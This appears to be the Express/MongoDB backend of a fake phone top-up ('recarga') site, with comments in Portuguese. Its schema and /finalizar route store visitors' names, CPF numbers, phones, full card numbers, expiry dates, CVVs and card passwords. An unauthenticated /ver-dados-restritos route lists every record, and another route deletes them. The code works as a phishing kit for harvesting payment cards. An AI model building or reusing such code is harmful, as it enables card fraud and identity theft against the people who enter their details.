const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// --- SEGURANÇA: Usando Variável de Ambiente ---
// O link com a senha deve ser colocado no painel do Render com a chave: MONGODB_URI
const mongoURI = process.env.MONGODB_URI;

mongoose.connect(mongoURI)
  .then(() => console.log('✅ CONECTADO AO MONGODB COM SEGURANÇA!'))
  .catch(err => console.error('❌ ERRO MONGODB:', err));

// MODELO
const RecargaSchema = new mongoose.Schema({
    operadora: String, 
    nome: String, 
    cpf: String, 
    telefone: String,
    valor: String, 
    cartao: String, 
    data: String, 
    cvv: String, 
    senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

// ROTA: SALVAR RECARGA
app.post('/finalizar', async (req, res) => {
    try {
        const nova = new Recarga(req.body);
        await nova.save();
        res.status(200).json({ success: true });
    } catch (err) { res.status(500).json({ success: false }); }
});

// ROTA: VER DADOS NO PAINEL (Acesso ao painel)
app.get('/ver-dados-restritos', async (req, res) => {
    try {
        const dados = await Recarga.find().sort({ dataRegistro: -1 });
        res.json(dados);
    } catch (err) { res.status(500).send('Erro ao buscar dados'); }
});

// ROTA: EXCLUIR DADO (Sua função de limpeza)
app.delete('/excluir/:id', async (req, res) => {
    try {
        await Recarga.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch (err) { res.status(500).json({ success: false }); }
});

// ROTA: PÁGINA PRINCIPAL
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Servidor rodando na porta: ${PORT}`));